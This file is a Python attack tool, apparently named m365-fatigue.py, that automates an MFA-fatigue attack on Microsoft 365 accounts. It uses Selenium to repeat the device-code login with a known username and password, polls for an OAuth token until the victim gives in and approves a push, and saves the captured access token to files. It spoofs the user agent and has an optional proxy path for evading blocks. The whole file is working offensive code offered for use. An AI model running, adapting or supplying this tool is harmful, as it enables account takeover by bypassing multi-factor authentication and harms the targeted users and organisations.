import requests
import sys
import json
import time
import base64
import getpass
from datetime import datetime, timedelta

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException
from selenium.webdriver.support.wait import WebDriverWait

def print_vars(user, password, fireprox_url=None):
    print("[*] Username:", user)
    print("[*] Password:", "*" * len(password))
    if fireprox_url:
        print("[*] Fireprox URL:", fireprox_url)

# Perform device code request
def get_code(client_id, resource, headers, fireprox_url=None):
    device_code_body = {
        "client_id": client_id,
        "resource": resource
    }

    if fireprox_url:
        print("[*] Getting code via fireprox:")
        print(fireprox_url+"oauth2/devicecode?api-version=1.0")
        device_code_response = requests.post(fireprox_url+"common/oauth2/devicecode?api-version=1.0", headers=headers, data=device_code_body).json()
    else:
        device_code_response = requests.post("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0", headers=headers, data=device_code_body).json()
    
    print("[*] Device code:")
    print(device_code_response["message"])  # Display device code message
    return device_code_response["user_code"], device_code_response["device_code"]


def login_automation(driver, code=None, user=None, password=None, fireprox_url=None):

    if fireprox_url:
        driver.get(fireprox_url+"common/oauth2/deviceauth")
    else:
        driver.get("https://login.microsoftonline.com/common/oauth2/deviceauth")
    
    print(driver.title)

    try:
        code_fld = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, "otc")))
        code_fld.clear()
        code_fld.send_keys(code)
        code_fld.send_keys(Keys.RETURN)
    except TimeoutException:
        print("Code field not found within 10 seconds")

    print(driver.current_url)

    try:
        usr_fld = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, "loginfmt")))
        usr_fld.clear()
        usr_fld.send_keys(user)
        usr_fld.send_keys(Keys.RETURN)
    except TimeoutException:
        print("Login field not found within 10 seconds")

    print(driver.current_url)

    try:
        pass_fld = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, "passwd")))
        pass_fld.clear()
        pass_fld.send_keys(password)
        pass_fld.send_keys(Keys.RETURN)
    except TimeoutException:
        print("Password field not found within 10 seconds")

# Poll for access token using device code
def init_polling(client_id, user_code, username, interval, device_code, headers, fireprox_url=None):

# TODO Function needs to be called with driver object and eventually click on the "next" link via selenium in case of Pushnumber MFA 

    access_token = None
    start_time = time.time()
    time_limit = interval
    remaining_time = time_limit

    while time.time() - start_time < time_limit:
        token_body = {
            "client_id": client_id,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "code": device_code,
            "scope": "openid"  # Replace with desired scope
        }

        try:
            if fireprox_url:
                tokens_response = requests.post(fireprox_url+"oauth2/token?api-version=1.0", headers=headers, data=token_body).json()
            else:
                tokens_response = requests.post("https://login.microsoftonline.com/common/oauth2/token?api-version=1.0", headers=headers, data=token_body).json()
            
            print(f"Remaining time: {remaining_time} seconds", end="\r")  # Print remaining time, overwrite previous output
            remaining_time = time_limit - int(time.time() - start_time)

            if "access_token" in tokens_response:
                access_token = tokens_response["access_token"]
                print("Base64 encoded JWT access_token:")
                print(access_token)

                token_payload = access_token.split(".")[1] + '=' * ((4 - len(access_token.split(".")[1]) % 4) % 4)
                token_array = json.loads(base64.b64decode(token_payload).decode('utf-8'))

                tenant_id = token_array["tid"]
                print("Decoded JWT payload:")
                print(json.dumps(token_array, indent=4))

                base_date = datetime(1970, 1, 1)
                token_expire = base_date + timedelta(seconds=token_array["exp"])
                print("[*] Successful authentication. Access token expires at:", token_expire)
                print("[*] Storing token...")
                
                # Generating timestamp
                timestamp = datetime.now().strftime("%Y%m%d%H%M%S")

                # Generating filenames
                txt_filename = f"access_token_{username}_{timestamp}.txt"
                json_filename = f"access_token_{username}_{timestamp}.json"

                # Storing access token as Base64 encoded version with timestamp
                with open(txt_filename, "w") as file_a:
                    file_a.write(access_token)
                    print(f"Stored Base64 encoded access token as '{txt_filename}'")

                # Storing access token in JSON format with timestamp
                with open(json_filename, "w") as file_b:
                    json.dump(token_array, file_b, indent=4)
                    print(f"Stored decoded access token as '{json_filename}'")

                continue_polling = False
                return True

        except requests.exceptions.HTTPError as e:
            details = e.response.json()
            if details.get("error") == "authorization_pending":
                time.sleep(3)
            else:
                print("Error:", details.get("error"))
                break

    return False


# TODO implement fireprox compability - it's buggy...

if __name__ == "__main__":
    # Azure AD / Microsoft identity platform app configuration
    client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    resource = "https://graph.microsoft.com"
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042"  # Replace with your user agent string
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": user_agent
    }

    args = iter(sys.argv[1:])
    user = None
    password = None
    interval = 60
    fireprox_url = None

    try:
        while True:
            arg = next(args)
            if arg == "--user":
                user = next(args)
            elif arg == "--password":
                password = next(args)
            elif arg == "--interval":
                interval = next(args)
            elif arg == "--fireprox":
                fireprox_url = next(args)
    except StopIteration:
        pass

    if user:
        if not password:
            password = getpass.getpass(prompt="Enter your password: ")
        print_vars(user, password, fireprox_url)
    else:
        print("Usage:")
        print("python3 m365-fatigue.py --user <username> [--password <password>] [--interval <seconds> (default: 60)]\n")
        print("Password will be prompted if not supplied directly!\n")
        
        sys.exit()

    driver = webdriver.Chrome()

    while True:
        driver.delete_all_cookies()

        user_code, device_code = get_code(client_id, resource, headers, fireprox_url)
    
        login_automation(driver, user_code, user, password, fireprox_url)
    
        if init_polling(client_id, user_code, user, interval, device_code, headers, fireprox_url):
            break
    
    print("Exiting...")
    driver.quit()
    
